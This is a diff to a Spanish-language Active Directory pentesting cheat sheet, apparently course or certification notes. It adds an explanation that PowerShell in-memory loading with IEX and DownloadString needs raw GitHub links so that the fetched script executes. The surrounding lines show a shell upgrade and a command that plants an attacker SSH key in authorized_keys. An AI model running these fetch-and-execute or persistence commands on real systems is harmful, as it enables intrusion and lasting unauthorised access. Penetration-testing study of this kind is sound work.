@@ -10,6 +10,8 @@ https://github.com/Spartan-Cybersecurity/CPAD-Tools        # Herramientas de ayu
 
 ## Comandos Extra AD 
 
+**NOTA:** Cuando se descargan herramientas en memoria usando `IEX (New-Object Net.WebClient).DownloadString(...)` en PowerShell con Github, el enlace debe apuntar siempre a la **versión RAW del archivo** y no a la página normal del repositorio. Esto se debe a que `IEX` necesita recibir únicamente el **código del script en texto plano** para poder interpretarlo y ejecutarlo; si se utiliza un enlace que no es RAW, lo que se descargará será HTML de la página web y el script no podrá ejecutarse correctamente.
+
 ```bash 
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 echo "ssh-rsa AAAAB3NzaC1= root@kali" >> ~/.ssh/authorized_keys
